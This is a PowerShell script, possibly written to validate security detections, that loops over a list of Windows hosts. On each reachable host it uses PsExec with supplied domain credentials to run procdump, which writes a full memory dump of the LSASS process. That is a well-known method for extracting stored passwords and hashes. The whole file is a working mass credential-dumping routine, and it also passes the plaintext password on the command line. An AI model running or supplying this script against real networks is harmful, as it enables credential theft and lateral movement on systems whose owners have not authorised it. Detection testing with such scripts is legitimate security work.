$computers = gc "C:\Validation\computers.txt"
$logfile = New-Item -Type file "C:\Validation\PSExecResults.txt"
$Credential = Get-Credential trad\prod_
$UserName = $Credential.UserName
$Password = $Credential.GetNetworkCredential().Password

foreach ($computer in $computers) {
    $logmessage = "Testing $computer"
    Add-Content $logfile $logmessage
    if (test-Connection -Cn $computer -quiet) {
        $logmessage = "$computer is online"
        Add-Content $logfile $logmessage
        & C:\pstools\psexec64.exe -h \\$computer /accepteula -u $UserName -p $Password C:\Windows\temp\procdump.exe -accepteula -ma lsass.exe lsass.dmp | Add-Content $logfile
    } else {
        $logmessage = "$computer is not online"
        Add-Content $logfile $logmessage
    }
}